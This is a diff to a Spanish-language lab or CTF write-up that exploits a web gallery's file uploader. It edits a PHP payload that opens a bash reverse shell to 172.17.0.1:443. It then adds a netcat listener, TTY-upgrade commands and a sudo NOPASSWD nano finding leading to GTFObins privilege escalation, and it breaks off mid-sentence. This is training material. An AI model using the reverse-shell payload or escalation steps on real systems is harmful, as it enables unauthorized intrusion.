@@ -24,14 +24,25 @@ Veremos que está disponible el subdirectorio `/gallery/` el cuál es un **Direc
 ## Paso N3: Explotando el file uploader
 crearemos un pequeño script en `php` el cual al ejecutarse se refleje una reverse shell y lo subimos.
 ```
-echo "<?php                
-system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
-?>" > script.php
+echo '<?php system("bash -c '"'"'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'"'"'"); ?>' > script.php
 ```
 Una vez subido, se vera reflejado en `http://172.17.0.2/gallery/uploads/images/`
 <img width="611" height="423" alt="image" src="https://github.com/user-attachments/assets/2845f527-dbf6-418a-b339-94f0cf19756b" />
 
 Si entramos al archivo escuchando en el puerto 443 con `nc -lvnp 443` habremos accedido al sistema.
+
+## Paso N4: Accediendo a usuarios
+Ya dentro del sistema, empezaremos tratando la terminal.
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+```
+Una vez tratada, ejecutaremos `sudo -l` y encontraremos `(gallery) NOPASSWD: /bin/nano`
+<img width="572" height="174" alt="image" src="https://github.com/user-attachments/assets/eacedecf-628b-47ad-acdd-eb1d99b11da1" />
+
+Por lo que de acuerdo con [GTFObins](https://gtfobins.org/gtfobins/nano/#shell)
 
 
 
